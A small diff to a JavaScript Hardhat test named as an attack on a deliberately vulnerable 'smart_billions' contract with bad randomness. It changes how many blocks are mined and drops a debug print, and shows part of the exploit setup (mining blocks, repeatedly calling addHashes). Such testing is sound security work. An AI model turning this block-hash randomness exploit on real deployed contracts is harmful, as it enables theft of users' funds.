@@ -29,9 +29,8 @@ describe('attack bad_randomness/smart_billions.sol', function () {
         const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
         expect(victimBalanceBefore).to.equal(amount);
         let block = await ethers.provider.getBlockNumber();
-        await mine(260 - block - 1);
+        await mine(260);
         block = await ethers.provider.getBlockNumber();
-        console.log(block);
         for (let i = 0; i < 64; i++) {
             await victim.connect(v).addHashes(256);
         }
